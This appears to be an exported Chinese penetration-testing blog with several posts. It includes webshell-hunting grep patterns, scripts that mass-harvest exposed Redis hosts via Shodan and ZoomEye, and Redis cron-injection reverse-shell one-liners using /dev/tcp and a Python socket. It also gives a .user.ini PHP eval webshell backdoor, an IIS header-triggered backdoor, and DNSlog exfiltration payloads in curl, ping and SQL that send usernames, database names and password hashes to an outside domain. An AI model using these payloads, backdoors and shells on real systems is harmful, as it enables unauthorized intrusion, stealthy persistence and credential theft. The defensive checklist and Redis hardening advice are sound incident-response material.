<p><strong>应用系统日志</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">MySQL; 在mysql.log找错误消息，看看有没有结构损坏的表， 是否有innodb修复进程在运行，是否有disk/index/query 问题.</div><div class="line">PHP-FPM; 如果设定了 php-slow 日志, 直接找错误信息 (php, mysql, memcache, …)。</div><div class="line">Varnish; 在varnishlog 和 varnishstat 里, 检查 hit/miss比. 看看配置信息里是否遗漏了什么规则，使最终用户可以直接攻击你的后端？</div><div class="line">HA-Proxy; 后端的状况如何？健康状况检查是否成功？是前端还是后端的队列大小达到最大值了？</div></pre></td></tr></table></figure></p>
<h1 id="入侵后恶意文件查找"><a href="#入侵后恶意文件查找" class="headerlink" title="入侵后恶意文件查找"></a>入侵后恶意文件查找</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">find -mtime -2 -type f -name \*.php 查找近2天被修改过的文件</div><div class="line">find /app -user root  查找app目录下属于root用户的文件</div><div class="line">查找存在制定关键字的恶意脚本木马</div><div class="line">find ./ -name &quot;*.php&quot; |xargs egrep &quot;phpspy|c99sh|milw0rm|eval\(gunerpress|eval\(base64_decode|spider_bc&quot;&gt; /tmp/php.txt</div><div class="line">grep -r --include=*.php  &apos;[^a-z]eval($_POST&apos; . &gt; /tmp/eval.txt</div><div class="line">grep -r --include=*.php  &apos;file_put_contents(.*$_POST\[.*\]);&apos; . &gt; /tmp/file_put_contents.txt</div><div class="line">find ./ -name &quot;*.php&quot; -type f -print0 | xargs -0 egrep &quot;(phpspy|c99sh|milw0rm|eval\(gzuncompress\(base64_decode|eval\(base64_decode|spider_bc|gzinflate)&quot; | awk -F: &apos;&#123;print $1&#125;&apos; | sort | uniq</div><div class="line">linux 下webshell查杀：</div><div class="line">find /www/ -name &quot;*.php&quot; |xargs egrep &apos;assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\&#123;\&quot;\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode&apos;</div><div class="line">查杀脚本：</div><div class="line">[webshell查杀脚本.py]()</div><div class="line">[webshellkill_linux.py]()</div><div class="line">rootkit查找</div><div class="line">windows下：</div><div class="line">[PC Hunter]http://www.xuetr.com/)</div><div class="line">[PowerTool] (http://about.me/ithurricanept)</div><div class="line">linux下：</div><div class="line">[Rootkit Hunter](http://rkhunter.sourceforge.net/)</div><div class="line">常规后门查找</div><div class="line">shift后门等</div><div class="line">[D盾_Web查杀](http://d99net.net/News.asp?id=62)</div><div class="line">[Safe3 WebShell Scanner](http://www.273tech.com/works/884981847/view.htm)</div><div class="line">[暗组Web杀毒 2.6](http://forum.cnsec.org/thread-93025-1-1.html)</div></pre></td></tr></table></figure>
<h1 id="其他方面检测"><a href="#其他方面检测" class="headerlink" title="其他方面检测"></a>其他方面检测</h1><ul>
<li>网络相关</li>
<li>异常流量</li>
<li>DDOS</li>
<li>ARP</li>
<li>DNS</li>
<li>数据库</li>
</ul>
<h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><p><strong>关键文件设置</strong><br>使用<code>chattr</code>命令防止系统中某个关键文件被修改：<code>chattr +i /etc/resolv.conf</code><br>查看使用：<code>lsattr /etc/resolv.conf</code><br>会显示如下属性</p>
<blockquote>
<p>—-i——– /etc/resolv.conf</p>
</blockquote>
<p>要想修改此文件就要把i属性去掉： <code>chattr -i /etc/resolv.conf</code><br>让某个文件只能往里面追加数据，但不能删除(用于各种日志文件上)：<code>chattr +a /var/log/messages</code><br><strong>系统命令被替换</strong></p>
<p>1、可以选择重新还原回去:<code>yum install e2fsprogs</code>;<br>2、也可以使用系统命令工具包busybox，最后<code>busybox 要还原的命令 -i</code><br><strong>日志查看</strong><br><code>/var/log/secure</code>日志可以查看<code>Accept</code>关键字;<br>查找访问和错误日志, 直接找<code>5xx</code>错误, 再看看是否有<code>limit_zone</code>错误;</p>
<p><strong>日志文件恢复</strong><br>linux下日志文件恢复可使用<code>lsof</code>恢复删除的日志文件(前提是不能关闭服务器，不能关闭相关服务或进程)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">lsof | grep access_log</div><div class="line">cat /proc/$PID/fd/$文件描述符 &gt; /var/log/httpd/access_log</div></pre></td></tr></table></figure></p>
<p><strong>部分命令无法执行</strong></p>
<p>当用户环境变量配置不当时，部分命令无法直接执行，需要在命令之前加上路径，如：/etc/sbin/ifconfig</p>
]]></content>
      
        
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 自动化 </tag>
            
            <tag> webshell </tag>
            
            <tag> linux </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[关于MongoDB未授权访问的学习]]></title>
      <url>/2017/01/13/%E5%85%B3%E4%BA%8EMongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>最近MongoDB的未授权访问不知道为啥，就是这样突然火了，其实你要是留意的话，其实在2014年的时候就已经有人在乌云刷过这个了，其实很简单，就是没密码，然后暴露到公网上喽。<br><a id="more"></a></p>
<p>本次主要做一些redis的一个测试，刚好最近再开发一个系统，刚好写几个脚本做插件，也提高下工作效率。</p>
<p>具体漏洞细节请参考：<a href="http://www.freebuf.com/vuls/85021.html" target="_blank" rel="external">redis未授权访问</a></p>
<p>然后利用ZoomEye和Shodan API进行条件批量筛选</p>
<p><strong>ZoomEye：</strong><code>https://api.zoomeye.org/host/search?query=&quot;关键词&quot;&amp;page=</code><br><strong>Shodan：</strong><code>pip install shodan</code></p>
<p><strong>Shodan python脚本如下：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Author：w2n1ck</div><div class="line">@博客：http://byd.dropsec.xyz/</div><div class="line">&apos;&apos;&apos;</div><div class="line">import shodan</div><div class="line">import os</div><div class="line">iplist = []</div><div class="line">ip_list = []</div><div class="line">shodan_ip_list = []</div><div class="line">def shodanSearch(keywords):</div><div class="line"></div><div class="line">    SHODAN_API_KEY = &quot;your key&quot;</div><div class="line">    api = shodan.Shodan(SHODAN_API_KEY)</div><div class="line"></div><div class="line">    total = 0</div><div class="line">    try:</div><div class="line">        results = api.search(keywords)</div><div class="line">        total = int(results[&apos;total&apos;])</div><div class="line">        for result in results[&apos;matches&apos;]:</div><div class="line">            #iplist.append(&#123;&quot;ip&quot;:result[&apos;ip_str&apos;],&quot;country&quot;:result[&apos;location&apos;][&apos;country_name&apos;]&#125;)</div><div class="line">            iplist.append(result[&apos;ip_str&apos;])</div><div class="line">            for i in range(len(iplist)):</div><div class="line">                ip_list = iplist[i].encode(&apos;utf-8&apos;)</div><div class="line">                shodan_ip_list.append(ip_list)</div><div class="line">                s = &apos;\n&apos;.join(shodan_ip_list)</div><div class="line">                with open(&apos;shodan_ip_list.txt&apos;,&apos;w&apos;) as output:</div><div class="line">                    output.write(s)</div><div class="line"></div><div class="line">    except shodan.APIError, e:</div><div class="line">        print &apos;Error: %s&apos; % e</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line"></div><div class="line">    shodanSearch(&apos;redis&apos;)</div></pre></td></tr></table></figure></p>
<p><strong>ZoomEye python脚本如下：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Author：w2n1ck</div><div class="line">@博客：http://byd.dropsec.xyz/</div><div class="line">&apos;&apos;&apos;</div><div class="line">import os</div><div class="line">import requests</div><div class="line">import json</div><div class="line">access_token = &apos;&apos;</div><div class="line">ip_list = []</div><div class="line"></div><div class="line">def login():</div><div class="line">    user = raw_input(&apos;[-] input : username :&apos;)</div><div class="line">    passwd = raw_input(&apos;[-] input : password :&apos;)</div><div class="line">    data = &#123;</div><div class="line">        &apos;username&apos; : user,</div><div class="line">        &apos;password&apos; : passwd</div><div class="line">    &#125;</div><div class="line">    data_encoded = json.dumps(data)  # dumps 将 python 对象转换成 json 字符串</div><div class="line">    try:</div><div class="line">        r = requests.post(url = &apos;https://api.zoomeye.org/user/login&apos;,data = data_encoded)</div><div class="line">        r_decoded = json.loads(r.text) # loads() 将 json 字符串转换成 python 对象</div><div class="line">        global access_token</div><div class="line">        access_token = r_decoded[&apos;access_token&apos;]</div><div class="line">    except Exception,e:</div><div class="line">        print &apos;[-] info : username or password is wrong, please try again &apos;</div><div class="line">        exit()</div><div class="line">def saveStrToFile(file,str):</div><div class="line">    with open(file,&apos;w&apos;) as output:</div><div class="line">        output.write(str)</div><div class="line">def saveListToFile(file,list):</div><div class="line">    s = &apos;\n&apos;.join(list)</div><div class="line">    with open(file,&apos;w&apos;) as output:</div><div class="line">        output.write(s)</div><div class="line">def apiTest():</div><div class="line">    page = 1</div><div class="line">    global access_token</div><div class="line">    with open(&apos;access_token.txt&apos;,&apos;r&apos;) as input:</div><div class="line">        access_token = input.read()</div><div class="line">    # 将 token 格式化并添加到 HTTP Header 中</div><div class="line">    headers = &#123;</div><div class="line">        &apos;Authorization&apos; : &apos;JWT &apos; + access_token,</div><div class="line">    &#125;</div><div class="line">    print headers</div><div class="line">    while(True):</div><div class="line">        try:</div><div class="line">            r = requests.get(url = &apos;https://api.zoomeye.org/host/search?query=&quot;redis&quot;&amp;page=&apos; + str(page),</div><div class="line">                         headers = headers)</div><div class="line">            &apos;&apos;&apos;</div><div class="line">            因为我们进行的是主机搜索，所以请求的接口为:</div><div class="line">            https://api.zoomeye.org/host/search?query=&quot;yoursring&quot;&amp;facet=app,os&amp;page=</div><div class="line">            如果进行web搜索，请求接口为:</div><div class="line">            https://api.zoomeye.org/web/search?query=&quot;port:21&quot;&amp;page=</div><div class="line">            ?query为要搜索的关键字</div><div class="line">            &apos;&apos;&apos;</div><div class="line">            r_decoded = json.loads(r.text)</div><div class="line">            # print r_decoded</div><div class="line">            # print r_decoded[&apos;total&apos;]</div><div class="line">            for x in r_decoded[&apos;matches&apos;]:</div><div class="line">                print x[&apos;ip&apos;]</div><div class="line">                ip_list.append(x[&apos;ip&apos;])</div><div class="line">            print &apos;[-] info : count &apos; + str(page * 10)</div><div class="line">        except Exception,e:</div><div class="line">            # 若搜索请求超过 API 允许的最大条目限制 或者 全部搜索结束，则终止请求</div><div class="line">            if str(e.message) == &apos;matches&apos;:</div><div class="line">                print &apos;[-] info : account was break, excceeding the max limitations&apos;</div><div class="line">                break</div><div class="line">            else:</div><div class="line">                print  &apos;[-] info : &apos; + str(e.message)</div><div class="line">        else:</div><div class="line">            if page == 10:</div><div class="line">                break</div><div class="line">            page += 1</div><div class="line">def main():</div><div class="line">    # 访问口令文件不存在则进行登录操作</div><div class="line">    if not os.path.isfile(&apos;access_token.txt&apos;):</div><div class="line">        print &apos;[-] info : access_token file is not exist, please login&apos;</div><div class="line">        login()</div><div class="line">        saveStrToFile(&apos;access_token.txt&apos;,access_token)</div><div class="line"></div><div class="line">    apiTest()</div><div class="line">    saveListToFile(&apos;zoomeye_ip_list.txt&apos;,ip_list)</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
<p>把要搜索的关键词改一下即可批量获取符合条件的主机地址：<br><img src="http://oa8y5guqs.bkt.clouddn.com/redis1.png" alt=""></p>
<p>然后就是redis的批量验证脚本,GitHub上有一个<a href="https://github.com/Ridter/hackredis" target="_blank" rel="external">hackredis</a>脚本能够验证redis未授权访问，然后批量登陆到ssh，但是我搜的，可能人品太差，一个都没登陆上，可能不对公网开放SSH服务了或者做了IP限制。<br><img src="http://oa8y5guqs.bkt.clouddn.com/redis2.png" alt=""></p>
<p>然后就换个思路，我们写入的密钥，会覆盖这个文件authorized_keys，如果原来服务器上管理员是使用过公钥的方法登陆就会导致管理员的公钥失效，容易被管理员发现。直接在redis下写个shell，种个后门，再加个rootkit，岂不是神不知道鬼不觉[斜眼]</p>
<p><strong>redis反弹shell：</strong></p>
<ol>
<li><p>CentOS</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">echo -e &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/远程主机/2333 0&gt;&amp;1\n\n&quot;|redis-cli -h 目标机 -x set 1</div><div class="line"></div><div class="line">config set dir /var/spool/cron</div><div class="line">ok</div><div class="line">config set dbfilename root</div><div class="line">ok</div><div class="line">save</div><div class="line">ok</div><div class="line"></div><div class="line">然后vps上nc监听</div><div class="line">nc -lvv 2333</div></pre></td></tr></table></figure>
</li>
<li><p>Ubuntu<br>如果是ubuntu的系统，是不能用bash弹shell的，可以使用python来反弹。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo -e &quot;\n\n*/1 * * * * /usr/bin/python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.0.0.1\&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;\n\n&quot;</div></pre></td></tr></table></figure>
</li>
</ol>
<p><strong>附加个建议：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">可以配置redis.conf这个文件，在redis-3.2.0目录下</div><div class="line">#默认只对本地开放</div><div class="line">bind 127.0.0.1</div><div class="line">#添加登陆密码</div><div class="line">requirepass appleu0</div><div class="line">#在需要对外开放的时候修改默认端口</div><div class="line">port 2333</div><div class="line">#最后还可以配合iptables限制开放</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Python </tag>
            
            <tag> 自动化 </tag>
            
            <tag> Redis </tag>
            
            <tag> MongoDB </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ini和iis后门]]></title>
      <url>/2017/01/03/ini%E5%92%8Ciis%E5%90%8E%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>最近看了两个关于ini和利用iis本身机制的后门。<br><a id="more"></a></p>
<h1 id="ini后门"><a href="#ini后门" class="headerlink" title="ini后门"></a>ini后门</h1><p><code>.user.ini</code>它比<code>.htaccess</code>用的更广，不管是<code>nginx/apache/IIS</code>，只要是以fastcgi运行的php都可以用这个方法。</p>
<p><code>.user.ini</code>实际上就是一个可以由用户“自定义”的<code>php.ini</code>，我们能够自定义的设置是模式为“<code>PHP_INI_PERDIR</code> 、 <code>PHP_INI_USER</code>”的设置。和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载</p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><ol>
<li><p>新建<code>.user.ini</code>，内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">auto_prepend_file=test.gif</div></pre></td></tr></table></figure>
</li>
<li><p>新建<code>test.gif</code>，内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">@eval($_REQUEST[shell]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>新建<code>echo.php</code>,内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">echo &quot;PHP is very good!&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>访问<code>echo.php</code>即可看到后门：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:8080/php-backdoor/echo.php?shell=phpinfo();</div></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="iis后门"><a href="#iis后门" class="headerlink" title="iis后门"></a>iis后门</h1><p>iis后门是用了iis本身的机制，当在http头里增加一字段即可触发后门，并执行发过来的命令。</p>
<p>正常情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">GET /pwet.htm HTTP/1.1</div><div class="line">Host: 192.168.73.143</div><div class="line">Accept-Encoding: identity</div><div class="line">Connection: Keep-Alive</div><div class="line">Content-type: application/x-www-form-urlencoded</div><div class="line">Accept: */*</div><div class="line"></div><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Thu, 03 Feb 2011 12:16:50 GMT</div><div class="line">Content-Length: 31</div><div class="line">Content-Type: text/html</div><div class="line">Last-Modified: Mon, 21 Jun 2010 11:53:19 GMT</div><div class="line">Accept-Ranges: bytes</div><div class="line">ETag: &quot;963779573811cb1:994&quot;</div><div class="line">Server: Microsoft-IIS/6.0</div><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line"></div><div class="line">Pouetpouet</div><div class="line"></div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>加入恶意字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">GET /pwet.htm HTTP/1.1</div><div class="line">Host: 192.168.73.143</div><div class="line">Accept-Encoding: identity</div><div class="line">X-Order: ListDir</div><div class="line">Connection: Keep-Alive</div><div class="line">X-Data: Qzpc</div><div class="line">Content-type: application/x-www-form-urlencoded</div><div class="line">Accept: */*</div><div class="line"></div><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Thu, 03 Feb 2011 12:16:57 GMT</div><div class="line">Content-Length: 353</div><div class="line">X-Resp: OK</div><div class="line">Content-Type: text/html</div><div class="line">Last-Modified: Mon, 21 Jun 2010 11:53:19 GMT</div><div class="line">Accept-Ranges: bytes</div><div class="line">ETag: &quot;963779573811cb1:994&quot;</div><div class="line">Server: Microsoft-IIS/6.0</div><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line"></div><div class="line">Pouetpouet</div><div class="line"></div><div class="line">&lt;/html&gt;</div><div class="line">[F] C:\AUTOEXEC.BAT</div><div class="line">[F] C:\boot.ini</div><div class="line">[F] C:\bootfont.bin</div><div class="line">[F] C:\CONFIG.SYS</div><div class="line">[D] C:\Documents and Settings</div><div class="line">[D] C:\Inetpub</div><div class="line">[F] C:\IO.SYS</div><div class="line">[F] C:\MSDOS.SYS</div><div class="line">[F] C:\NTDETECT.COM</div><div class="line">[F] C:\ntldr</div><div class="line">[F] C:\pagefile.sys</div><div class="line">[D] C:\Program Files</div><div class="line">[D] C:\System Volume Information</div><div class="line">[D] C:\WINDOWS</div><div class="line">[D] C:\wmpub</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> WAF绕过 </tag>
            
            <tag> PHP </tag>
            
            <tag> webshell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[渗透测试小技巧之DNSlog]]></title>
      <url>/2016/12/04/dnslog%E5%88%A9%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>在渗透环境时，我们经常会遇到疑似命令执行还有些bool注入和延时注入，但是都没有回显。</p>
<a id="more"></a>
<p>命令执行我们可能会用各种各样的请求来判断是否存在命令执行，对于bool注入和延时注入这两种注入类型的缺点就是速度慢，效率低，一个是基于对错判断数据，一个是基于访问时间来判断数据，dnslog的出现就正好弥补了这样的缺陷。</p>
<h1 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h1><p>这里参考<a href="https://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf" target="_blank" rel="external">一篇paper</a> ,一个大牛的详细解释:<a href="https://ricterz.me/posts/%E7%AC%94%E8%AE%B0:%20Data%20Retrieval%20over%20DNS%20in%20SQL%20Injection%20Attacks" target="_blank" rel="external">DNS in SQL Injection Attacks</a></p>
<p>简单说就是：DNSLog 用于监测 DNS 和 HTTP 访问记录，可通过HTTP请求，让目标主机主动<br>请求 DNSLog API 地址，有相应的解析记录，则可判定为存在相应的漏洞。</p>
<h1 id="0x01-利用"><a href="#0x01-利用" class="headerlink" title="0x01 利用"></a>0x01 利用</h1><p>首先给大家分享<a href="http://ceye.io/" target="_blank" rel="external">一个免费的dnslog平台</a>(ps:要是有cloudeye激活码的可以忽略)。</p>
<p>平台会给每一个会员分一个二级域名，<code>xxx.ceye.io</code>。</p>
<p>简单的来说，dnslog平台自己保留dns的日志信息，并对应每个会员一个二级域名，这样我们可以通过</p>
<blockquote>
<p>ping test.xxxxx.ceye.io</p>
</blockquote>
<p>这样的多级域名方式，把我们需要返回的信息链接到url中，然后分析日志，test部分就是我们得到的信息。</p>
<h2 id="0x01-1-命令执行"><a href="#0x01-1-命令执行" class="headerlink" title="0x01.1 命令执行"></a>0x01.1 命令执行</h2><p>在我们找到命令执行漏洞的时候，我们可以执行这样的命令判断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">linux:</div><div class="line">curl http://ip.port.domain.ceye.io/`whoami`</div><div class="line">ping `whoami`.ip.port.domain.ceye.io</div><div class="line">windows:</div><div class="line">ping %USERNAME%.domain.ceye.io</div></pre></td></tr></table></figure>
<p>这时候就可以去dnslog瓶体查看到信息</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/dnslog1.png" alt=""></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/dnslog2.png" alt=""></p>
<h2 id="0x01-2-SQL注入"><a href="#0x01-2-SQL注入" class="headerlink" title="0x01.2 SQL注入"></a>0x01.2 SQL注入</h2><p><strong>SQL Server</strong><br>存储程序master..xp_dirtree（）用于获取所有文件夹的列表和给定文件夹内部的子文件夹。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">DECLARE @host varchar(1024);</div><div class="line">注册一个名为@host的变量，类型为varchar。</div><div class="line">SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;</div><div class="line">获取db_name()然后转换成varchar类型，然后吧获取的db_name()返回值拼接到dnslog平台给我们的子域名里面，然后赋值给@host变量。</div><div class="line">EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);</div><div class="line">列远程主机的foobar$目录,由于是远程主机，所以会做一个dns解析，这样我们的dns平台就能得到日志了</div><div class="line"></div><div class="line">http://xxxx.com.cn/?Id=123&apos;;DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);--</div></pre></td></tr></table></figure></p>
<p><strong>Oracle</strong><br>UTL_INADDR包用于互联网的寻址–诸如检索本地和远程主机的主机名和IP的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">SELECT UTL_INADDR.GET_HOST_ADDRESS(&apos;ip.port.b182oj.ceye.io&apos;);</div><div class="line">SELECT UTL_HTTP.REQUEST(&apos;http://ip.port.b182oj.ceye.io/oracle&apos;) FROM DUAL;</div><div class="line">SELECT HTTPURITYPE(&apos;http://ip.port.b182oj.ceye.io/oracle&apos;).GETCLOB() FROM DUAL;</div><div class="line">SELECT DBMS_LDAP.INIT((&apos;oracle.ip.port.b182oj.ceye.io&apos;,80) FROM DUAL;</div><div class="line">SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=&apos;SYS&apos;)||&apos;.ip.port.b182oj.ceye.io&apos;,80) FROM DUAL;</div></pre></td></tr></table></figure></p>
<p><strong>MySQL</strong><br>MySQL的函数LOAD_FILE()读取文件内容并将其作为字符串返回：LOAD_FILE()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM user WHERE user=&apos;root&apos; LIMIT 1),&apos;.b182oj.ceye.io\\abc&apos;));</div></pre></td></tr></table></figure></p>
